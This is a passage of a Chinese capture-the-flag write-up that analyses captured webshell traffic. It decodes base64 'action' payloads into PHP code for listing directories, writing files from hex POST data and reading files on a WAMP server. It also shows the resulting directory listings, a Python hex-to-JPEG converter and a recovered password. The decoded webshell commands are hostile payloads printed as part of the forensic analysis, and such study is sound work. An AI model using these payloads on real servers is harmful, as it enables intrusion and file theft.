class="string">&quot;Y-m-d H:i:s&quot;</span>, @<span class="title function_ invoke__">filemtime</span>(<span class="variable">$P</span>)); <span class="comment">// 获取文件最后修改时间</span></span><br><span class="line">        <span class="variable">$E</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">base_convert</span>(@<span class="title function_ invoke__">fileperms</span>(<span class="variable">$P</span>), <span class="number">10</span>, <span class="number">8</span>), -<span class="number">4</span>); <span class="comment">// 获取文件权限</span></span><br><span class="line">        <span class="variable">$R</span> = <span class="string">&quot;\t&quot;</span> . <span class="variable">$T</span> . <span class="string">&quot;\t&quot;</span> . @<span class="title function_ invoke__">filesize</span>(<span class="variable">$P</span>) . <span class="string">&quot;\t&quot;</span> . <span class="variable">$E</span> . <span class="string">&quot;&quot;</span>; <span class="comment">// 构建输出格式</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据是否为目录，将文件或目录信息添加到相应的变量中</span></span><br><span class="line">        <span class="keyword">if</span> (@<span class="title function_ invoke__">is_dir</span>(<span class="variable">$P</span>)) &#123;</span><br><span class="line">            <span class="variable">$M</span> .= <span class="variable">$N</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$R</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$L</span> .= <span class="variable">$N</span> . <span class="variable">$R</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出目录和文件列表</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$M</span> . <span class="variable">$L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭目录句柄</span></span><br><span class="line">    @<span class="title function_ invoke__">closedir</span>(<span class="variable">$F</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结束分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&lt;-&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终止脚本执行</span></span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>代码功能为获取文件夹的内容，需要参数<code>z1</code>。<br>此处<code>z1</code>：<code>RDpcd2FtcDY0XHd3d1x1cGxvYWQ%3D</code>，解码后为<code>D:\wamp64\www\upload</code>，将返回的结果格式化后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|</span><br><span class="line">./    2017-12-08 11:38:58	0	0777</span><br><span class="line">../    2017-12-08 11:39:10	4096	0777</span><br><span class="line">1.php    2017-12-08 11:33:16	33	0666</span><br><span class="line">flag.txt    2017-12-08 11:35:29	17	0666</span><br><span class="line">hello.zip    2017-12-08 09:32:36	224	0666</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure><div class="tag-plugin colorful note" color="yellow"><div class="body"><p>我们可以注意到有个flag.txt和hello.zip（我们要的flag在中hello.zip，其实flag.txt并没有获取）</p></div></div></div></details><details class="folder" index="2"><summary><p>查看文件夹D:\wamp64\www\</p>
+</summary><div class="body"><p>将<code>z1</code>换为<code>RDpcd2FtcDY0XHd3d1w%3D</code>，解码后为<code>D:\wamp64\www\</code>，将输出格式化后为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|</span><br><span class="line">./    2017-12-08 11:39:10	4096	0777</span><br><span class="line">../    2017-11-17 18:15:03	4096	0777</span><br><span class="line">admin/    2017-11-17 18:15:53	8192	0777</span><br><span class="line">install/    2017-11-17 18:15:54	4096	0777</span><br><span class="line">tools/    2017-11-17 18:15:54	4096	0777</span><br><span class="line">typecho/    2017-12-08 11:39:10	4096	0777</span><br><span class="line">upload/    2017-12-08 11:38:58	0	0777</span><br><span class="line">usr/    2017-11-17 18:15:54	0	0777</span><br><span class="line">var/    2017-11-17 18:15:54	4096	0777</span><br><span class="line">.gitattributes    2015-05-02 05:31:05	386	0666</span><br><span class="line">.gitignore    2015-05-02 05:31:05	234	0666</span><br><span class="line">.gitmodules    2015-05-02 05:31:05	0	0666</span><br><span class="line">.travis.yml    2015-05-02 05:31:05	114	0666</span><br><span class="line">aa.php    2017-10-27 16:02:31	26	0666</span><br><span class="line">changelog.txt    2015-05-02 05:31:05	2135	0666</span><br><span class="line">config.inc.php    2017-10-26 14:01:04	1521	0666</span><br><span class="line">index.php    2015-05-02 05:31:05	721	0666</span><br><span class="line">install.php    2015-05-02 05:31:05	47405	0666</span><br><span class="line">license.txt    2015-05-02 05:31:05	14974	0666</span><br><span class="line">p0.php    2017-10-26 14:31:28	26	0666</span><br><span class="line">README.md    2015-05-02 05:31:05	205	0666</span><br><span class="line">todo.txt    2015-05-02 05:31:05	122	0666</span><br><span class="line">x1n.php    2017-10-26 14:51:13	27	0666</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure></div></details><details class="folder" index="3"><summary><p>查看文件夹D:\wamp64\</p>
+</summary><div class="body"><p>将<code>z1</code>换为<code>RDpcd2FtcDY0XA%3D%3D</code>，解码后为<code>D:\wamp64\</code>，结果格式化为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|</span><br><span class="line">./    2017-11-17 18:15:03	4096	0777</span><br><span class="line">../    2017-12-08 04:45:53	4096	0777</span><br><span class="line">alias/    2017-11-17 18:15:03	0	0777</span><br><span class="line">apps/    2017-11-17 18:15:03	0	0777</span><br><span class="line">bin/    2017-11-17 18:15:24	0	0777</span><br><span class="line">cgi-bin/    2017-11-17 18:15:32	0	0777</span><br><span class="line">lang/    2017-11-17 18:15:32	4096	0777</span><br><span class="line">logs/    2017-11-17 18:15:32	0	0777</span><br><span class="line">scripts/    2017-11-17 18:15:32	4096	0777</span><br><span class="line">tmp/    2017-11-27 06:51:26	40960	0777</span><br><span class="line">www/    2017-12-08 11:39:10	4096	0777</span><br><span class="line">barimage.bmp    2010-12-31 01:39:42	4790	0666</span><br><span class="line">images_off.bmp    2016-08-01 08:21:38	26934	0666</span><br><span class="line">images_on.bmp    2016-08-01 08:22:36	26934	0666</span><br><span class="line">install-english.txt    2016-10-16 07:09:46	3380	0666</span><br><span class="line">license-english.txt    2015-11-06 03:00:26	8156	0666</span><br><span class="line">read_after_install-english.txt    2016-03-08 11:45:22	1191	0666</span><br><span class="line">unins000.dat    2017-10-10 07:11:50	972306	0666</span><br><span class="line">unins000.exe    2017-10-10 07:09:38	1401105	0777</span><br><span class="line">uninstall_services.bat    2017-10-10 07:09:51	132	0777</span><br><span class="line">wampmanager.conf    2017-11-14 14:28:47	1636	0666</span><br><span class="line">wampmanager.exe    2008-09-03 07:46:36	1233408	0777</span><br><span class="line">wampmanager.ini    2017-12-08 11:33:55	508782	0666</span><br><span class="line">wampmanager.tpl    2016-08-22 02:42:00	24039	0666</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure></div></details></div>
 
 <h3 id="3-Hex-转写-Jpg"><a href="#3-Hex-转写-Jpg" class="headerlink" title="3. Hex 转写 Jpg"></a>3. Hex 转写 Jpg</h3><p>接着在<code>D:\wamp64\www\upload</code>文件夹中新建图片<code>6666.jpg</code>，并且写入二进制信息。</p>
-<details class="tag-plugin colorful folding" color="light"><summary><span>写入图片的php代码</span></summary><div class="body"><p>action 为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskZj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JGM9JF9QT1NUWyJ6MiJdOyRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOyRjPXN0cl9yZXBsYWNlKCJcbiIsIiIsJGMpOyRidWY9IiI7Zm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MikkYnVmLj11cmxkZWNvZGUoIiUiLnN1YnN0cigkYywkaSwyKSk7ZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1Zik%2FIjEiOiIwIik7O2VjaG8oInw8LSIpO2RpZSgpOw</span><br></pre></td></tr></table></figure><p>解码后的 php 为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关闭错误显示</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除脚本执行的时间限制</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭魔术引号</span></span><br><span class="line">@<span class="title function_ invoke__">set_magic_quotes_runtime</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出开始分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-&gt;|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解码通过POST方法传递的文件路径</span></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;z1&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取通过POST方法传递的文件内容</span></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&quot;z2&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清除可能存在的回车和换行符</span></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化缓冲区变量</span></span><br><span class="line"><span class="variable">$buf</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制编码的字符串转换为原始二进制数据</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>); <span class="variable">$i</span> += <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="variable">$buf</span> .= <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%&quot;</span> . <span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="variable">$i</span>, <span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试写入文件，并根据操作结果输出“1”或“0”</span></span><br><span class="line"><span class="keyword">echo</span> (@<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$f</span>, <span class="string">&quot;w&quot;</span>), <span class="variable">$buf</span>) ? <span class="string">&quot;1&quot;</span> : <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结束分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&lt;-&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终止脚本执行</span></span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure></div></details>
+<details class="tag-plugin colorful folding" color="light"><summary><p>写入图片的php代码</p>
+</summary><div class="body"><p>action 为</p> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskZj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JGM9JF9QT1NUWyJ6MiJdOyRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOyRjPXN0cl9yZXBsYWNlKCJcbiIsIiIsJGMpOyRidWY9IiI7Zm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MikkYnVmLj11cmxkZWNvZGUoIiUiLnN1YnN0cigkYywkaSwyKSk7ZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1Zik%2FIjEiOiIwIik7O2VjaG8oInw8LSIpO2RpZSgpOw</span><br></pre></td></tr></table></figure>  <p>解码后的 php 为：</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关闭错误显示</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除脚本执行的时间限制</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭魔术引号</span></span><br><span class="line">@<span class="title function_ invoke__">set_magic_quotes_runtime</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出开始分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-&gt;|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解码通过POST方法传递的文件路径</span></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;z1&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取通过POST方法传递的文件内容</span></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&quot;z2&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清除可能存在的回车和换行符</span></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化缓冲区变量</span></span><br><span class="line"><span class="variable">$buf</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制编码的字符串转换为原始二进制数据</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>); <span class="variable">$i</span> += <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="variable">$buf</span> .= <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%&quot;</span> . <span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="variable">$i</span>, <span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试写入文件，并根据操作结果输出“1”或“0”</span></span><br><span class="line"><span class="keyword">echo</span> (@<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$f</span>, <span class="string">&quot;w&quot;</span>), <span class="variable">$buf</span>) ? <span class="string">&quot;1&quot;</span> : <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结束分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&lt;-&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终止脚本执行</span></span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure> </div></details>
 
 <p>输入的参数<code>z1</code>（图片名）为<code>D:\wamp64\www\upload\6666.jpg</code>，<code>z2</code>为图片的十六进制信息。<br>我们获取到<code>z2</code>后,将其转换为<code>.jpg</code>格式。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># HexToJpg.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_jpg</span>(<span class="params">hex_file_path, jpg_file_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将十六进制文本文件转换为JPEG图片文件。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param hex_file_path: 十六进制文本文件的路径。</span></span><br><span class="line"><span class="string">    :param jpg_file_path: 要保存JPEG图片的路径。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(hex_file_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> hex_file:</span><br><span class="line">        <span class="comment"># 从文件中读取十六进制数据</span></span><br><span class="line">        hex_data = hex_file.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删除任何空白字符（空格、换行符等）</span></span><br><span class="line">    hex_data = hex_data.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将十六进制数据转换为二进制数据</span></span><br><span class="line">    binary_data = <span class="built_in">bytes</span>.fromhex(hex_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将二进制数据写入JPEG文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(jpg_file_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> jpg_file:</span><br><span class="line">        jpg_file.write(binary_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例使用：</span></span><br><span class="line">hex_file_path = <span class="string">r&quot;.\6666.txt&quot;</span>  <span class="comment"># 替换为你的十六进制文件路径</span></span><br><span class="line">jpg_file_path = <span class="string">&quot;6666.jpg&quot;</span>  <span class="comment"># 替换为你希望保存的JPEG文件路径</span></span><br><span class="line">hex_to_jpg(hex_file_path, jpg_file_path)</span><br></pre></td></tr></table></figure>
 
-<p>转换后的图片如下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/CTF/Misc/traffic_analysis_1/6666.jpg" alt="traffic_analysis_1"></p>
+<p>转换后的图片如下：<br><img src="/assets/CTF/Misc/traffic_analysis_1/6666.jpg" alt="traffic_analysis_1"></p>
 <p>拿到关键信息<code>Th1s_1s_p4sswd_!!!</code></p>
 <h3 id="4-zip-文件头"><a href="#4-zip-文件头" class="headerlink" title="4. zip 文件头"></a>4. zip 文件头</h3><p>接着读取了<code>D:\wamp64\www\upload\hello.zip</code>文件。</p>
-<details class="tag-plugin colorful folding" color="light"><summary><span>读取zip的php代码</span></summary><div class="body"><p>action 为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D</span><br></pre></td></tr></table></figure><p>解码后脚本为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 关闭错误显示，防止错误信息泄露</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除脚本执行的时间限制，允许脚本长时间运行</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭魔术引号，防止自动添加转义字符</span></span><br><span class="line">@<span class="title function_ invoke__">set_magic_quotes_runtime</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出开始分隔符，用于标识响应开始</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-&gt;|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从POST请求中获取base64编码的文件路径，并进行解码</span></span><br><span class="line"><span class="variable">$F</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;z1&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试以只读模式打开文件</span></span><br><span class="line"><span class="variable">$P</span> = @<span class="title function_ invoke__">fopen</span>(<span class="variable">$F</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查文件是否成功打开</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$P</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果文件打开失败，输出错误信息并终止脚本</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR:// File cannot be opened.&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件内容，filesize($F)获取文件大小，确保读取整个文件</span></span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">fread</span>(<span class="variable">$P</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$F</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭文件句柄，释放资源</span></span><br><span class="line">@<span class="title function_ invoke__">fclose</span>(<span class="variable">$P</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结束分隔符，用于标识响应结束</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&lt;-&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终止脚本执行</span></span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div></details>
+<details class="tag-plugin colorful folding" color="light"><summary><p>读取zip的php代码</p>
+</summary><div class="body"><p>action 为</p> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D</span><br></pre></td></tr></table></figure>  <p>解码后脚本为：</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 关闭错误显示，防止错误信息泄露</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除脚本执行的时间限制，允许脚本长时间运行</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭魔术引号，防止自动添加转义字符</span></span><br><span class="line">@<span class="title function_ invoke__">set_magic_quotes_runtime</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出开始分隔符，用于标识响应开始</span></span><br><span 